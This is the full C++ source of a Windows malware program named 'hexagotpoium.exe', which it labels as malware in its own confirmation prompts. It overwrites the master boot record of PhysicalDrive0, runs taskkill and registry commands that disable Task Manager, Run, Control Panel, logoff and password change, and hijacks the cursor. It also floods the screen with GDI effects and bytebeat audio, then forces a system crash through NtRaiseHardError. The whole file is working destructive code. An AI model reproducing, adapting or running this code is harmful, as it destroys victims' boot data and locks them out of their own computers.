#include <windows.h>    
#pragma comment(lib, "winmm.lib")
#include <stdint.h>     
#include <random>       
#include <chrono>  
#define M_PI   3.14159265358979323846264338327950288
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

static ULONGLONG n, r;
int randy() { return n = r, n ^= 0x8ebf635bee3c6d25, n ^= n << 5 | n >> 26, n *= 0xf3e05ca5c43e376b, r = n, n & 0x7fffffff; }

const unsigned char MBR[]{
    0xE8, 0x03, 0x00, 0xE8, 0x1D, 0x00, 0xB4, 0x00, 0xB0, 0x13, 0xCD, 0x10, 0x68, 0x00, 0xA0, 0x07,
0xB4, 0x0C, 0x30, 0xC0, 0x31, 0xDB, 0x31, 0xC9, 0x31, 0xD2, 0xC3, 0x31, 0xC9, 0x31, 0xD2, 0xFF,
0x06, 0x5D, 0x7C, 0xEB, 0x12, 0x81, 0xF9, 0x40, 0x01, 0x73, 0x2D, 0x81, 0xFA, 0xC8, 0x00, 0x73,
0xEA, 0xCD, 0x10, 0x41, 0xEB, 0xED, 0xC3, 0x89, 0xCB, 0x31, 0xD3, 0x88, 0xD8, 0x02, 0x06, 0x5D,
0x7C, 0xC0, 0xE8, 0x02, 0xEB, 0x00, 0x3C, 0x34, 0x77, 0x06, 0x3C, 0x1E, 0x72, 0x06, 0xEB, 0xD5,
0x2C, 0x0D, 0xEB, 0xF2, 0x04, 0x05, 0xEB, 0xEE, 0x31, 0xC9, 0x42, 0xEB, 0xC6, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};

DWORD WINAPI MBRWiper(LPVOID lpParam) {
    DWORD dwBytesWritten;
    HANDLE hDevice = CreateFileW(
        L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
        FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
        OPEN_EXISTING, 0, 0);

    WriteFile(hDevice, MBR, 512, &dwBytesWritten, 0);
    return 1;
}

DWORD WINAPI payload2(LPVOID lpParam)
{
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);

    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(
        nullptr, (w * h) * sizeof(RGBQUAD),
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    int t = 0;

    DWORD start = GetTickCount();

    while (GetTickCount() - start < 30000)
    {
        HDC desk = GetDC(nullptr);
        HDC memDC = CreateCompatibleDC(desk);
        HBITMAP hbm = CreateCompatibleBitmap(desk, w, h);

        SelectObject(memDC, hbm);

        for (int i = 0; i < w * h; i++)
        {
            int x = i % w;
            int y = i / w;
            BYTE val = (BYTE)((x ^ y >> t * (i * (x ^ (i * y)))) & 0xFF * (t * 100));

            data[i].rgbRed = val;
            data[i].rgbGreen = val / 2;
            data[i].rgbBlue = 255 - val;
            data[i].rgbReserved = 0;
        }

        SetBitmapBits(hbm, w * h * sizeof(RGBQUAD), data);
        BitBlt(desk, 0, 0, w, h, memDC, 0, 0, SRCCOPY);

        DeleteObject(hbm);
        DeleteDC(memDC);
        ReleaseDC(nullptr, desk);

        t++;
    }

    VirtualFree(data, 0, MEM_RELEASE);
    return 0;
}
DWORD WINAPI Bytebeat(LPVOID lpParam)
{
    const int sampleRate = 8000;
    const int duration = 30;
    const int samples = sampleRate * duration;

    BYTE* buffer = new BYTE[samples];

    for (int t = 0; t < samples; t++)
    {
        buffer[t] = (BYTE)t * ((t >> 12 | t >> 8) & 683 & t >> 2);
    }

    WAVEFORMATEX wf = { 0 };
    wf.wFormatTag = WAVE_FORMAT_PCM;
    wf.nChannels = 1;
    wf.nSamplesPerSec = sampleRate;
    wf.wBitsPerSample = 8;
    wf.nBlockAlign = 1;
    wf.nAvgBytesPerSec = sampleRate;

    HWAVEOUT hWave;
    if (waveOutOpen(&hWave, WAVE_MAPPER, &wf, 0, 0, CALLBACK_NULL) != MMSYSERR_NOERROR)
    {
        delete[] buffer;
        return 1;
    }

    WAVEHDR header = { 0 };
    header.lpData = (LPSTR)buffer;
    header.dwBufferLength = samples;
    waveOutPrepareHeader(hWave, &header, sizeof(header));
    waveOutWrite(hWave, &header, sizeof(header));

    Sleep(30000);

    waveOutUnprepareHeader(hWave, &header, sizeof(header));
    waveOutClose(hWave);
    delete[] buffer;

    return 0;
}
void RefreshScreen(HDC hdcScreen, HDC hdcMemory, int width, int height)
{

    StretchBlt(hdcScreen, 0, 0, width, height, hdcMemory, 0, 0, width, height, SRCCOPY);
}
DWORD WINAPI GDI2Effect(LPVOID lpParam)
{
    int w = GetSystemMetrics(SM_CXSCREEN);
    int hgt = GetSystemMetrics(SM_CYSCREEN);

    HDC screen1 = GetDC(NULL);
    if (!screen1) return 0;

    BITMAPINFO bi = { 0 };
    bi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bi.bmiHeader.biWidth = w;
    bi.bmiHeader.biHeight = -hgt;
    bi.bmiHeader.biPlanes = 1;
    bi.bmiHeader.biBitCount = 32;
    bi.bmiHeader.biCompression = BI_RGB;

    void* bits = nullptr;
    HBITMAP bmp = CreateDIBSection(screen1, &bi, DIB_RGB_COLORS, &bits, NULL, 0);
    if (!bmp || !bits) {
        ReleaseDC(NULL, screen1);
        return 0;
    }

    HDC memdc = CreateCompatibleDC(screen1);
    if (!memdc) {
        DeleteObject(bmp);
        ReleaseDC(NULL, screen1);
        return 0;
    }

    SelectObject(memdc, bmp);
    BitBlt(memdc, 0, 0, w, hgt, screen1, 0, 0, SRCCOPY);

    std::mt19937 rng(GetTickCount());
    std::uniform_int_distribution<int> dist(-40, 40);
    std::uniform_int_distribution<int> skip(1, 4);

    DWORD start = GetTickCount();

    while (GetTickCount() - start < 30000)
    {
        for (int y = 0; y < hgt; y += skip(rng))
        {
            int off = dist(rng);
            BitBlt(screen1, off, y, w, 2, memdc, 0, y, SRCERASE);
        }
    }

    DeleteDC(memdc);
    DeleteObject(bmp);
    ReleaseDC(NULL, screen1);
    return 0;
}
DWORD WINAPI Bytebeat2(LPVOID lpParam)
{
    const int sampleRate = 8000;
    const int duration = 30;
    const int64_t samples = int64_t(sampleRate) * duration;

    BYTE* buffer = new BYTE[samples];
    for (int64_t t = 0; t < samples; t++)
        buffer[t] = (BYTE)2 * t ^ 2 * t + (t >> 7) & t >> 12 | t >> 4 - (1 ^ 6 & t >> 619) | t >> 76;

    WAVEFORMATEX wf = {};
    wf.wFormatTag = WAVE_FORMAT_PCM;
    wf.nChannels = 1;
    wf.nSamplesPerSec = sampleRate;
    wf.wBitsPerSample = 8;
    wf.nBlockAlign = 1;
    wf.nAvgBytesPerSec = sampleRate;

    HWAVEOUT hWave;
    if (waveOutOpen(&hWave, WAVE_MAPPER, &wf, 0, 0, CALLBACK_NULL) != MMSYSERR_NOERROR)
    {
        delete[] buffer;
        return 1;
    }

    WAVEHDR header = {};
    header.lpData = reinterpret_cast<LPSTR>(buffer);
    header.dwBufferLength = static_cast<DWORD>(samples);

    waveOutPrepareHeader(hWave, &header, sizeof(header));
    waveOutWrite(hWave, &header, sizeof(header));

    Sleep(duration * 1000);

    waveOutUnprepareHeader(hWave, &header, sizeof(header));
    waveOutClose(hWave);

    delete[] buffer;
    return 0;
}

DWORD WINAPI WaveEffect(LPVOID lpParam)
{
    DWORD duration = 30000;

    ULONGLONG start = GetTickCount64();

    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);

    HDC screenDC = GetDC(0);
    HDC memDC = CreateCompatibleDC(screenDC);
    HBITMAP memBmp = CreateCompatibleBitmap(screenDC, width, height);
    SelectObject(memDC, memBmp);

    float angle = 0.0f;
    float amplitude = 0.0f;

    while (GetTickCount64() - start < duration)
    {
        BitBlt(memDC, 0, 0, width, height, screenDC, 0, 0, SRCCOPY);

        for (int y = 0; y < height; y++)
        {
            int offset = (int)(amplitude * sin(angle + y * 0.003f));
            BitBlt(screenDC, 0, y, width, 1, memDC, offset, y, SRCCOPY);
        }

        for (int x = 0; x < width; x++)
        {
            int offset = (int)(amplitude * sin(angle + x * 0.003f));
            BitBlt(screenDC, x, 0, 1, height, memDC, x, offset, SRCCOPY);
        }

        amplitude += 4.0f;
        angle += 0.05f;
        Sleep(10);
    }

    DeleteObject(memBmp);
    DeleteDC(memDC);
    ReleaseDC(0, screenDC);

    return 0;
}


DWORD WINAPI Bytebeat3(LPVOID lpParam)
{
    const int sampleRate = 8000;
    const int duration = 30;
    const int64_t samples = int64_t(sampleRate) * duration;


    BYTE* buffer = new BYTE[samples];

    for (int64_t t = 0; t < samples; t++)
    {
        BYTE val = (BYTE)t >> 5 | (t << 3) + 12 * t * (t >> 13 | (t >> 1 | t >> 10 | t >> 2) & t >> 8);
        buffer[t] = val;
    }


    WAVEFORMATEX wf = {};
    wf.wFormatTag = WAVE_FORMAT_PCM;
    wf.nChannels = 1;
    wf.nSamplesPerSec = sampleRate;
    wf.wBitsPerSample = 8;
    wf.nBlockAlign = 1;
    wf.nAvgBytesPerSec = sampleRate;

    HWAVEOUT hWave;
    if (waveOutOpen(&hWave, WAVE_MAPPER, &wf, 0, 0, CALLBACK_NULL) != MMSYSERR_NOERROR)
    {
        delete[] buffer;
        return 1;
    }

    WAVEHDR header = {};
    header.lpData = reinterpret_cast<LPSTR>(buffer);
    header.dwBufferLength = static_cast<DWORD>(samples);

    if (waveOutPrepareHeader(hWave, &header, sizeof(header)) != MMSYSERR_NOERROR)
    {
        waveOutClose(hWave);
        delete[] buffer;
        return 1;
    }

    waveOutWrite(hWave, &header, sizeof(header));


    Sleep(duration * 1000);

    waveOutUnprepareHeader(hWave, &header, sizeof(header));
    waveOutClose(hWave);
    delete[] buffer;

    return 0;
}
DWORD WINAPI TEXTZSPAMZ(LPVOID lpParam)
{
    LPCWSTR lptext = L"hexagotpoium.exe";

    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);

    DWORD start = GetTickCount(); 

    while (GetTickCount() - start < 30000) 
    {
        HDC hdc = GetWindowDC(GetDesktopWindow());

        COLORREF textColor = RGB(rand() % 256, rand() % 256, rand() % 256);
        COLORREF bgColor = RGB(rand() % 256, rand() % 256, rand() % 256);

        SetTextColor(hdc, textColor);
        SetBkColor(hdc, bgColor);

        TextOutW(hdc, rand() % sw, rand() % sh, lptext, lstrlenW(lptext));

        ReleaseDC(GetDesktopWindow(), hdc);
    }

    return 0;
}
DWORD WINAPI Bytebeat4(LPVOID lpParam)
{
    const int sampleRate = 8000;
    const int duration = 30;
    const int64_t samples = int64_t(sampleRate) * duration;


    BYTE* buffer = new BYTE[samples];

    for (int64_t t = 0; t < samples; t++)
    {
        BYTE val = (BYTE)t * ((t / 2 >> 10 | t % 16 * t >> 8) & 8 * t >> 12 & 18) | -(t / 16) + 64;
        buffer[t] = val;
    }


    WAVEFORMATEX wf = {};
    wf.wFormatTag = WAVE_FORMAT_PCM;
    wf.nChannels = 1;
    wf.nSamplesPerSec = sampleRate;
    wf.wBitsPerSample = 8;
    wf.nBlockAlign = 1;
    wf.nAvgBytesPerSec = sampleRate;

    HWAVEOUT hWave;
    if (waveOutOpen(&hWave, WAVE_MAPPER, &wf, 0, 0, CALLBACK_NULL) != MMSYSERR_NOERROR)
    {
        delete[] buffer;
        return 1;
    }

    WAVEHDR header = {};
    header.lpData = reinterpret_cast<LPSTR>(buffer);
    header.dwBufferLength = static_cast<DWORD>(samples);

    if (waveOutPrepareHeader(hWave, &header, sizeof(header)) != MMSYSERR_NOERROR)
    {
        waveOutClose(hWave);
        delete[] buffer;
        return 1;
    }

    waveOutWrite(hWave, &header, sizeof(header));


    Sleep(duration * 1000);

    waveOutUnprepareHeader(hWave, &header, sizeof(header));
    waveOutClose(hWave);
    delete[] buffer;

    return 0;
}
DWORD WINAPI DrawRandomPie(LPVOID lpParam)
{
    DWORD startTime = GetTickCount(); 
    const DWORD duration = 30000;     

    HDC hdc = GetDC(NULL); 
    if (!hdc)
        return 1; 

    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);

    while (GetTickCount() - startTime < duration)
    {
      
        HBRUSH brush = CreateSolidBrush(RGB(rand() % 256, rand() % 256, rand() % 256));
        if (brush)
        {
            SelectObject(hdc, brush);

         
            Pie(hdc,
                rand() % screenWidth, rand() % screenHeight,
                rand() % screenWidth, rand() % screenHeight,
                rand() % screenWidth, rand() % screenHeight,
                rand() % screenWidth, rand() % screenHeight);

            DeleteObject(brush);
        }

        Sleep(1); 
    }

    ReleaseDC(NULL, hdc);

    return 0; 
}
DWORD WINAPI Bytebeat5(LPVOID lpParam)
{
    const int sampleRate = 8000;
    const int duration = 30;
    const int64_t samples = int64_t(sampleRate) * duration;

    BYTE* buffer = new BYTE[samples];

    for (int64_t t = 0; t < samples; t++)
    {
        int64_t tt = t;
        int64_t val =
            ((tt / 2 * (4 | (7 & (tt >> 13))) >> ((~tt >> 11) & 1)) & 127) +
            ((tt * 2 * ((tt >> 11) & (tt >> 13)) * ((~tt >> 9) & 3)) & 128);

        buffer[t] = static_cast<BYTE>(val & 0xFF);
    }

    WAVEFORMATEX wf = {};
    wf.wFormatTag = WAVE_FORMAT_PCM;
    wf.nChannels = 1;
    wf.nSamplesPerSec = sampleRate;
    wf.wBitsPerSample = 8;
    wf.nBlockAlign = 1;
    wf.nAvgBytesPerSec = sampleRate;

    HWAVEOUT hWave;
    if (waveOutOpen(&hWave, WAVE_MAPPER, &wf, 0, 0, CALLBACK_NULL) != MMSYSERR_NOERROR)
    {
        delete[] buffer;
        return 1;
    }

    WAVEHDR header = {};
    header.lpData = reinterpret_cast<LPSTR>(buffer);
    header.dwBufferLength = static_cast<DWORD>(samples);

    if (waveOutPrepareHeader(hWave, &header, sizeof(header)) != MMSYSERR_NOERROR)
    {
        waveOutClose(hWave);
        delete[] buffer;
        return 1;
    }

    waveOutWrite(hWave, &header, sizeof(header));

   
    while (!(header.dwFlags & WHDR_DONE))
    {
        Sleep(10);
    }

    waveOutUnprepareHeader(hWave, &header, sizeof(header));
    waveOutClose(hWave);
    delete[] buffer;

    return 0;
}
DWORD WINAPI patblt(LPVOID lpParam)
{
    HDC hdc = 0;
    int sx = 0, sy = 0;
    int rx = 0, ry = 0;

    while (1)
    {
        hdc = GetWindowDC(GetDesktopWindow());
        sx = GetSystemMetrics(SM_CXSCREEN);
        sy = GetSystemMetrics(SM_CYSCREEN);
        rx = rand() % sx;
        ry = rand() % sy;
        SelectObject(hdc, CreateSolidBrush(RGB(rand() % 225, rand() % 225, rand() % 225)));
        PatBlt(hdc, 0, 0, sx, sy, PATINVERT);
        Sleep(10);
    }
}
DWORD WINAPI Bytebeat6(LPVOID lpParam)
{
    const int sampleRate = 32000;
    const int duration = 30;
    const int64_t samples = int64_t(sampleRate) * duration;

    BYTE* buffer = new BYTE[samples];

    for (int64_t t = 0; t < samples; t++)
    {
        uint64_t tt = t; 
        uint64_t shift1 = (tt >> 175) % 64;
        uint64_t shift2 = (tt >> 13) & 37;
        uint64_t shift3 = (tt >> 171) % 64;

        uint64_t val = tt >> ((tt / (74 + shift1) * (17 + shift2)) % 64) >> ((6664562 & shift3) % 64);

        buffer[t] = static_cast<BYTE>(val & 0xFF);
    }

    WAVEFORMATEX wf = {};
    wf.wFormatTag = WAVE_FORMAT_PCM;
    wf.nChannels = 1;
    wf.nSamplesPerSec = sampleRate;
    wf.wBitsPerSample = 8;
    wf.nBlockAlign = 1;
    wf.nAvgBytesPerSec = sampleRate;

    HWAVEOUT hWave;
    if (waveOutOpen(&hWave, WAVE_MAPPER, &wf, 0, 0, CALLBACK_NULL) != MMSYSERR_NOERROR)
    {
        delete[] buffer;
        return 1;
    }

    WAVEHDR header = {};
    header.lpData = reinterpret_cast<LPSTR>(buffer);
    header.dwBufferLength = static_cast<DWORD>(samples);

    if (waveOutPrepareHeader(hWave, &header, sizeof(header)) != MMSYSERR_NOERROR)
    {
        waveOutClose(hWave);
        delete[] buffer;
        return 1;
    }

    waveOutWrite(hWave, &header, sizeof(header));

    while (!(header.dwFlags & WHDR_DONE))
    {
        Sleep(10);
    }

    waveOutUnprepareHeader(hWave, &header, sizeof(header));
    waveOutClose(hWave);
    delete[] buffer;

    return 0;
}
DWORD WINAPI cur(LPVOID lpParam) {
    while (1) {
        int X = rand() % 1367;
        int Y = rand() % 769;
        SetCursorPos(X, Y);
    }
}
DWORD WINAPI spiral(LPVOID lpParam) {
    HDC desk = GetDC(0);
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    int counter = M_PI * M_PI * M_PI, xSize = sh, ySize = sw / 45;
    RECT rekt;
    POINT pt[3];

    DWORD startTime = GetTickCount(); 

    while (GetTickCount() - startTime < 30000) {
        for (int i = 0; i < sh / 3; i++) {

            if (GetTickCount() - startTime >= 30000)
                return 0;

            HDC desk = GetDC(0);
            GetWindowRect(GetDesktopWindow(), &rekt);

            pt[0].x = rekt.left + counter;
            pt[0].y = rekt.top - sin(i / ((float)xSize) * M_PI) * (ySize);

            pt[1].x = rekt.right + counter;
            pt[1].y = rekt.top + counter;

            pt[2].x = rekt.left - counter;
            pt[2].y = rekt.bottom - counter;

            PlgBlt(desk, pt, desk, rekt.left, rekt.top,
                rekt.right - rekt.left, rekt.bottom - rekt.top,
                0, 0, 0);

            Sleep(6);
        }
    }

    return 0;
}
DWORD WINAPI Bytebeat7(LPVOID lpParam)
{
    const int sampleRate = 8000;
    const int duration = 30;
    const DWORD samples = sampleRate * duration;

    BYTE* buffer = new BYTE[samples];

    for (DWORD t = 0; t < samples; t++)
    {
        DWORD val =
            (t & 4096) ? (t / 2 * (t ^ (t % 255)) | (t >> 5))
            : (t / 8 | ((t & 8192) ? 4 * t : t));

        buffer[t] = (BYTE)(val & 0xFF);
    }

    WAVEFORMATEX wf{};
    wf.wFormatTag = WAVE_FORMAT_PCM;
    wf.nChannels = 1;
    wf.nSamplesPerSec = sampleRate;
    wf.wBitsPerSample = 8;
    wf.nBlockAlign = 1;
    wf.nAvgBytesPerSec = sampleRate;

    HWAVEOUT hWave;

    if (waveOutOpen(&hWave, WAVE_MAPPER, &wf, 0, 0, CALLBACK_NULL) != MMSYSERR_NOERROR)
    {
        delete[] buffer;
        return 1;
    }

    WAVEHDR header{};
    header.lpData = (LPSTR)buffer;
    header.dwBufferLength = samples;

    if (waveOutPrepareHeader(hWave, &header, sizeof(header)) != MMSYSERR_NOERROR)
    {
        waveOutClose(hWave);
        delete[] buffer;
        return 1;
    }

    waveOutWrite(hWave, &header, sizeof(header));


    while (!(header.dwFlags & WHDR_DONE))
    {
        Sleep(50);
    }

    waveOutUnprepareHeader(hWave, &header, sizeof(header));
    waveOutClose(hWave);

    delete[] buffer;

    return 0;
}
DWORD WINAPI disabler(LPVOID lpParam) {
    system("taskkill /f /im taskmgr.exe");
    system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableTaskMgr /t reg_dword /d 1 /f");
    system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoRun /t reg_dword /d 1 /f");
    system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoControlPanel /t reg_dword /d 1 /f");
    system("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v HideFastUserSwitching /t REG_DWORD /d 1 /f");
    system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoLogoff /t REG_DWORD /d 1 /f");
    system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableLockWorkstation /t REG_DWORD /d 1 /f");
    system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableChangePassword /t REG_DWORD /d 1 /f");
    return 1;
}
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nShowCmd)
{
    if (MessageBoxW(nullptr, L"Execute malware?", L"hexagotpoium.exe", MB_ICONWARNING | MB_YESNO) != IDYES)
        return 1;

    if (MessageBoxW(nullptr, L"you sure made by minty", L"hexagotpoium.exe", MB_ICONWARNING | MB_YESNO) != IDYES)
        return 1;
    CreateThread(0, 0, MBRWiper, 0, 0, 0);
    CreateThread(0, 0, disabler, 0, 0, 0);

    HANDLE thread1 = CreateThread(0, 0, cur, 0, 0, 0);

    HANDLE hThreadPayload2 = CreateThread(nullptr, 0, payload2, nullptr, 0, nullptr);
    HANDLE hThreadBytebeat1 = CreateThread(nullptr, 0, Bytebeat, nullptr, 0, nullptr);

    WaitForSingleObject(hThreadPayload2, INFINITE);
    WaitForSingleObject(hThreadBytebeat1, INFINITE);

    CloseHandle(hThreadPayload2);
    CloseHandle(hThreadBytebeat1);


    HANDLE hThreadGDI2 = CreateThread(nullptr, 0, GDI2Effect, nullptr, 0, nullptr);
    HANDLE hThreadBytebeat2 = CreateThread(nullptr, 0, Bytebeat2, nullptr, 0, nullptr);

    WaitForSingleObject(hThreadGDI2, INFINITE);
    WaitForSingleObject(hThreadBytebeat2, INFINITE);

    CloseHandle(hThreadGDI2);
    CloseHandle(hThreadBytebeat2);


    HANDLE hThreadPayload3 = CreateThread(nullptr, 0, WaveEffect, nullptr, 0, nullptr);
    HANDLE hThreadBytebeat3 = CreateThread(nullptr, 0, Bytebeat3, nullptr, 0, nullptr);

    WaitForSingleObject(hThreadPayload3, INFINITE);
    WaitForSingleObject(hThreadBytebeat3, INFINITE);

    CloseHandle(hThreadPayload3);
    CloseHandle(hThreadBytebeat3);


    HANDLE hThreadBytebeat4 = CreateThread(nullptr, 0, Bytebeat4, nullptr, 0, nullptr);
    HANDLE hThreadTextSpam = CreateThread(nullptr, 0, TEXTZSPAMZ, nullptr, 0, nullptr);

    WaitForSingleObject(hThreadBytebeat4, INFINITE);
    WaitForSingleObject(hThreadTextSpam, INFINITE);

    CloseHandle(hThreadBytebeat4);
    CloseHandle(hThreadTextSpam);


    HANDLE hThreadBytebeat5 = CreateThread(nullptr, 0, Bytebeat5, nullptr, 0, nullptr);
    HANDLE hThreadPie = CreateThread(nullptr, 0, DrawRandomPie, nullptr, 0, nullptr);

    WaitForSingleObject(hThreadBytebeat5, INFINITE);
    WaitForSingleObject(hThreadPie, INFINITE);

    CloseHandle(hThreadBytebeat5);
    CloseHandle(hThreadPie);


    HANDLE hThreadPatblt = CreateThread(nullptr, 0, patblt, nullptr, 0, nullptr);
    HANDLE hThreadBytebeat6 = CreateThread(nullptr, 0, Bytebeat6, nullptr, 0, nullptr);

    WaitForSingleObject(hThreadBytebeat6, INFINITE);

    HANDLE hThreadBytebeat7 = CreateThread(nullptr, 0, Bytebeat7, nullptr, 0, nullptr);
    HANDLE hThreadSpiral = CreateThread(nullptr, 0, spiral, nullptr, 0, nullptr);

    WaitForSingleObject(hThreadBytebeat7, INFINITE);
    WaitForSingleObject(hThreadSpiral, INFINITE);

    CloseHandle(hThreadBytebeat6);
    CloseHandle(hThreadBytebeat7);
    CloseHandle(hThreadSpiral);
    CloseHandle(hThreadPatblt);
    BOOLEAN bl;
    DWORD response;
    NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
    RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
    RtlAdjustPrivilege(19, 1, 0, &bl);
    ULONG_PTR args[] = { 0xc0000067 };
    NtRaiseHardError(0xC0000145, 1, 0, (PULONG)args, 6, &response);
    return 0;
}
